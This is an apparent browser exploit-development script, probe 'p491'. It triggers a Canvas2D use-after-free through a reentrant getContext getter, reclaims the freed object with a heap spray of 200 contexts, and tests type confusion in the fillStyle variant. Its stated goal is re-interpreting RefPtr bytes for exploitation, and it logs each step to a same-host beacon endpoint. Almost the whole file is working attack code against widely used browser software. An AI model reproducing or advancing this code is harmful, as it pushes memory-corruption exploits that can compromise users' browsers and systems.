// p491 — CanvasStyle std::variant cross-alias probe: fillStyle + CanvasGradient
//
// CONTEXT: We have a Canvas2D aliased pair (CVE-2026-43720 reentrant getContext).
//   dCtx1 and sprayX1[idx1] point to the SAME C++ CanvasRenderingContext2D.
//
// CanvasStyle holds a std::variant<Invalid, Color, RefPtr<CanvasGradient>,
// RefPtr<CanvasPattern>, CurrentColor>. Setting fillStyle = gradient stores a
// RefPtr in the variant. READING fillStyle calls toStyleVariant() -> returns
// the RefPtr -> IDL binding wraps it as a JS CanvasGradient object.
//
// QUESTIONS:
//   1. Set gradient on spray side, read on dangling side: do the RefPtr bytes
//      flow through and re-wrap as a JS object?
//   2. Is the re-wrapped object the SAME JS wrapper (=== / marker) or a fresh
//      wrapper over the same impl?
//   3. Can we read gradient internal state through the aliased path?
//   4. Set gradient on one side, COLOR on the other: is the variant consistent
//      (same C++ state) or does one side return stale/confused data?
//      If the getter interprets Color bytes as a Gradient RefPtr -> crash/leak.
//
// EXPLOITATION ANGLE: cross-side variant re-interpretation of the RefPtr bytes.
//
// Beacon prefix: V491-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V491-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  function safeStr(v) {
    try {
      if (v === null) return 'null';
      if (v === undefined) return 'undefined';
      var t = typeof v;
      if (t === 'string') return '"' + v + '"';
      if (t === 'number' || t === 'boolean') return String(v);
      var tn = '';
      try { tn = Object.prototype.toString.call(v); } catch(e2) {}
      var ctor = '';
      try { ctor = v.constructor ? v.constructor.name : '?'; } catch(e3) {}
      var s = '';
      try { s = String(v); } catch(e4) { s = 'toStr-throw:' + e4.message; }
      return t + '|' + tn + '|ctor=' + ctor + '|str=' + s;
    } catch(e) {
      return 'describe-throw:' + e.message;
    }
  }

  B('BOOT', navigator.userAgent);

  var hasCanvasGradientGlobal = false;
  try { hasCanvasGradientGlobal = (typeof CanvasGradient !== 'undefined'); } catch(e) {}
  B('ENV', 'CanvasGradientGlobal=' + hasCanvasGradientGlobal);

  // ═══════════════════════════════════════════════════════════
  // STEP 1: UAF aliased pair (p487 pattern)
  // ═══════════════════════════════════════════════════════════
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  document.body.appendChild(tc1);

  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() {
      cc1++;
      if (cc1 === 1) dCtx1 = tc1.getContext('2d');
      return false;
    }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  // Same-type spray: reclaim the freed slot with a live 2d context
  var sprayC1 = [], sprayX1 = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC1.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 100 + i;
    sprayX1.push(ctx);
  }

  var lw1 = -999;
  try { lw1 = dCtx1.lineWidth; } catch(e) { B('ALIAS-ERR', 'lw-throw:' + e.message); return; }

  if (typeof lw1 !== 'number' || lw1 < 100 || lw1 >= 300) {
    B('ALIAS-MISS', 'lw=' + lw1);
    return;
  }
  var idx1 = Math.round(lw1 - 100);
  B('ALIAS', 'idx=' + idx1 + ',lw=' + lw1);

  // Confirm bidirectional alias before touching fillStyle
  var aRW = -1, aRR = -1;
  try {
    sprayX1[idx1].lineWidth = 77.5;
    aRW = dCtx1.lineWidth;
    dCtx1.lineWidth = 88.25;
    aRR = sprayX1[idx1].lineWidth;
    sprayX1[idx1].lineWidth = 100 + idx1;
  } catch(e) { B('ALIAS-RW-ERR', e.message); }
  B('ALIAS-VERIFY', 'sprayWrite_dangRead=' + aRW + ',dangWrite_sprayRead=' + aRR);

  // Baseline fillStyle on BOTH sides before any gradient work
  var fsBase1 = '', fsBase2 = '';
  try { fsBase1 = safeStr(sprayX1[idx1].fillStyle); } catch(e) { fsBase1 = 'throw:' + e.message; }
  try { fsBase2 = safeStr(dCtx1.fillStyle); } catch(e) { fsBase2 = 'throw:' + e.message; }
  B('BASELINE-FS', 'spray=' + fsBase1 + ',dangling=' + fsBase2);

  // ═══════════════════════════════════════════════════════════
  // STEP 2: Create CanvasGradient through the aliased (live) impl
  // ═══════════════════════════════════════════════════════════
  var grad = null;
  try {
    grad = sprayX1[idx1].createLinearGradient(0, 0, 100, 100);
  } catch(e) {
    B('GRAD-CREATE-ERR', 'spray-throw:' + e.message);
  }
  if (!grad) {
    try {
      grad = dCtx1.createLinearGradient(0, 0, 100, 100);
      B('GRAD-CREATE', 'fallback-dangling-ok');
    } catch(e2) {
      B('GRAD-CREATE-ERR2', 'dangling-throw:' + e2.message);
      B('DONE', 'no-gradient-possible');
      return;
    }
  } else {
    B('GRAD-CREATE', 'ok,type=' + typeof grad + ',s=' + safeStr(grad));
  }

  // Give the gradient known internal state + a JS-side marker
  var myMark = 0x491;
  try { grad.addColorStop(0, '#ff0000'); } catch(e) { B('GSTOP0-ERR', e.message); }
  try { grad.addColorStop(1, '#0000ff'); } catch(e) { B('GSTOP1-ERR', e.message); }
  var markSet = false;
  try { grad.__v491mark = myMark; markSet = true; } catch(e) { B('GMARK-ERR', e.message); }
  B('GRAD-PREP', 'stops=2,markSet=' + markSet + ',mark=' + myMark);

  // A second gradient created ONLY on the dangling side, for the reverse test
  var gradD = null;
  try {
    gradD = dCtx1.createLinearGradient(200, 0, 300, 0);
    gradD.addColorStop(0, '#00ff00');
    gradD.addColorStop(1, '#ffff00');
    B('GRAD-D-OK', safeStr(gradD));
  } catch(e) {
    B('GRAD-D-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // STEP 3: Set fillStyle = gradient on SPRAY side
  // Variant now holds RefPtr<CanvasGradient>
  // ═══════════════════════════════════════════════════════════
  var setBack = '';
  try {
    sprayX1[idx1].fillStyle = grad;
    B('GRAD-SET', 'ok');
  } catch(e) {
    B('GRAD-SET-ERR', 'throw:' + e.name + ':' + e.message);
  }
  // Read back on the SAME side to confirm the store took
  try { setBack = safeStr(sprayX1[idx1].fillStyle); B('GRAD-SET-BACK', setBack); }
  catch(e) { B('GRAD-SET-BACK', 'throw:' + e.message); }

  // ═══════════════════════════════════════════════════════════
  // STEP 4: Read fillStyle from DANGLING side
  // toStyleVariant() -> canvasGradient() -> RefPtr -> re-wrap?
  // Pre-allocate result vars (no allocation between risky ops)
  // ═══════════════════════════════════════════════════════════
  var gresult = null;
  var greadErr = '';
  B('PRE-GRAD-READ', 'about to read dangling fillStyle');
  try {
    gresult = dCtx1.fillStyle;
  } catch(e) {
    greadErr = e.name + ':' + e.message;
  }
  if (greadErr) {
    B('GRAD-READ-ERR', greadErr);
  } else {
    B('GRAD-READ', safeStr(gresult));
  }

  // ═══════════════════════════════════════════════════════════
  // STEP 5: IDENTITY check
  //   eq=true          -> same JS wrapper came back
  //   eq=false + marker match -> different wrapper, SAME JS object cache
  //   eq=false + marker null  -> fresh JS wrapper over same impl
  //   string returned  -> RefPtr bytes did NOT survive the dangling path
  // ═══════════════════════════════════════════════════════════
  var eq = (gresult === grad);
  var markGot = null;
  try { if (gresult && typeof gresult === 'object') markGot = gresult.__v491mark; }
  catch(e) { markGot = 'mark-throw'; }
  var inst = '';
  try {
    if (gresult && typeof gresult === 'object' && hasCanvasGradientGlobal) {
      inst = 'instanceof=' + (gresult instanceof CanvasGradient);
    }
  } catch(e) { inst = 'inst-throw'; }
  B('IDENTITY-EQ', 'eq=' + eq + ',markerGot=' + markGot + ',markerMine=' + myMark + ',' + inst);

  // Reverse-direction set: put the result (possibly fresh wrapper) into the
  // DANGLING side, then read back on SPRAY side and compare against grad.
  // If that round-trip returns === grad, both sides share one JS wrapper cache.
  var rt = null, rtEq = false, rtErr = '';
  try {
    if (gresult && typeof gresult === 'object') {
      dCtx1.fillStyle = gresult;
      rt = sprayX1[idx1].fillStyle;
      rtEq = (rt === grad);
      B('ID-ROUNDTRIP', 'setViaDangling,sprayRead===' + rtEq + ',s=' + safeStr(rt));
    }
  } catch(e) { rtErr = e.name + ':' + e.message; B('ID-ROUNDTRIP-ERR', rtErr); }

  // ═══════════════════════════════════════════════════════════
  // STEP 6: Internal state of the returned gradient object
  //   6a. addColorStop behaviour (RangeError text on bad offset)
  //   6b. Paint with the returned object via DANGLING side, read pixels
  //       via SPRAY side: proves the gradient IMPL is alive and shared.
  // ═══════════════════════════════════════════════════════════
  if (gresult && typeof gresult === 'object') {
    var acs = '';
    try {
      gresult.addColorStop(0.5, '#00ff00');
      acs = 'addStop-ok';
    } catch(e) { acs = 'addStop-throw:' + e.name + ':' + e.message; }
    var bad = '';
    try {
      gresult.addColorStop(5, 'rgb(1,2,3)');
      bad = 'no-throw(on=5)';
    } catch(e) { bad = 'throw:' + e.name + ':' + e.message; }

    var px = '';
    try {
      dCtx1.fillStyle = gresult;   // paint gradient via dangling side
      dCtx1.fillRect(0, 0, 10, 10);
      var id = sprayX1[idx1].getImageData(0, 0, 1, 1);   // read via spray side
      px = 'pixel0=' + id.data[0] + ',' + id.data[1] + ',' + id.data[2] + ',' + id.data[3];
      var id2 = sprayX1[idx1].getImageData(9, 9, 1, 1);
      px += ';pixel9=' + id2.data[0] + ',' + id2.data[1] + ',' + id2.data[2] + ',' + id2.data[3];
      px += ' (expect r>200@0, b>200@9)';
    } catch(e) { px = 'paint-throw:' + e.name + ':' + e.message; }

    B('GRAD-STATE', 'self=' + acs + ';bad=' + bad + ';' + px);
  } else {
    B('GRAD-STATE', 'result-not-object,skip=' + safeStr(gresult));
  }

  // ═══════════════════════════════════════════════════════════
  // STEP 7: CROSS-READ — color <-> color consistency
  // Both sides point at one C++ state; writes on one must show on other.
  // ═══════════════════════════════════════════════════════════
  var c1 = '', c2 = '';
  try {
    sprayX1[idx1].fillStyle = '#ff0000';
    c1 = safeStr(dCtx1.fillStyle);
    dCtx1.fillStyle = '#0000ff';
    c2 = safeStr(sprayX1[idx1].fillStyle);
  } catch(e) { B('CROSS-SET-ERR', e.message); }
  B('CROSS-READ', 'sprayColor_dangRead=' + c1 + ',dangColor_sprayRead=' + c2);

  // ═══════════════════════════════════════════════════════════
  // STEP 8: TYPE-CONFUSION — gradient -> color variant flip
  //   8a. gradient on BOTH sides, then COLOR replaces the RefPtr on spray
  //       side. Read dangling side EXPECTING gradient:
  //       - color string  -> variant flip is consistent (no confusion)
  //       - object/crash  -> RefPtr bytes were re-interpreted / stale
  //   8b. Reverse: gradient set via DANGLING side only, then color on spray
  //       side, read dangling again.
  //   8c. Last: dangling holds gradient RefPtr, spray flips twice
  //       (grad -> color -> grad) and we read between each flip.
  // Each sub-step beaconed BEFORE the risky write so a crash localizes.
  // ═══════════════════════════════════════════════════════════
  B('PRE-TC-8A', 'about to set spray fillStyle=' + safeStr(grad));
  var tc8a = '';
  try {
    sprayX1[idx1].fillStyle = grad;      // variant := RefPtr
    sprayX1[idx1].fillStyle = '#123456'; // variant := Color (releases RefPtr)
    tc8a = safeStr(dCtx1.fillStyle);     // dangling read, gradient expected
    B('TYPE-CONFUSION', '8a_sprayGradThenColor,dangRead=' + tc8a);
  } catch(e) {
    B('TYPE-CONFUSION-ERR', '8a:' + e.name + ':' + e.message);
  }

  B('PRE-TC-8B', 'about to set dangling fillStyle=' + safeStr(gradD));
  var tc8b = '';
  try {
    if (gradD) {
      dCtx1.fillStyle = gradD;           // RefPtr via dangling wrapper
      tc8b = safeStr(sprayX1[idx1].fillStyle);
      sprayX1[idx1].fillStyle = '#abcdef';
      var tc8b2 = safeStr(dCtx1.fillStyle);
      B('TYPE-CONFUSION', '8b_dangGrad,sprayRead=' + tc8b + ',thenColor_dangRead=' + tc8b2);
    } else {
      B('TYPE-CONFUSION', '8b_skipped,no-gradD');
    }
  } catch(e) {
    B('TYPE-CONFUSION-ERR', '8b:' + e.name + ':' + e.message);
  }

  B('PRE-TC-8C', 'about to double-flip variant on spray side');
  try {
    sprayX1[idx1].fillStyle = grad;        // RefPtr
    var t1 = safeStr(dCtx1.fillStyle);
    sprayX1[idx1].fillStyle = '#deadbeef'.slice(0, 7); // Color  (validated string)
    var t2 = safeStr(dCtx1.fillStyle);
    sprayX1[idx1].fillStyle = grad;        // RefPtr again
    var t3 = safeStr(dCtx1.fillStyle);
    B('TYPE-CONFUSION', '8c_flip1=' + t1 + ',flip2=' + t2 + ',flip3=' + t3 + ',expectObj=' + (t1 === t3));
  } catch(e) {
    B('TYPE-CONFUSION-ERR', '8c:' + e.name + ':' + e.message);
  }

  // Sanity: the variant object junk test (IDL should reject plain object)
  var junk = '';
  try {
    sprayX1[idx1].fillStyle = {};
    junk = 'no-throw,fs=' + safeStr(sprayX1[idx1].fillStyle);
  } catch(e) { junk = 'throw:' + e.name + ':' + e.message; }
  B('VARIANT-JUNK', junk);

  // Alias still alive after all variant churn?
  var lwFinal = -999;
  try { lwFinal = dCtx1.lineWidth; } catch(e) { lwFinal = 'throw:' + e.message; }
  B('FINAL-CHECK', 'lw=' + lwFinal + ',expected=' + (100 + idx1));

  B('DONE', 'p491 completed, alias=' + (lwFinal === 100 + idx1));

  // Auto-refresh after 10s
  setTimeout(function() { location.reload(); }, 10000);
})();
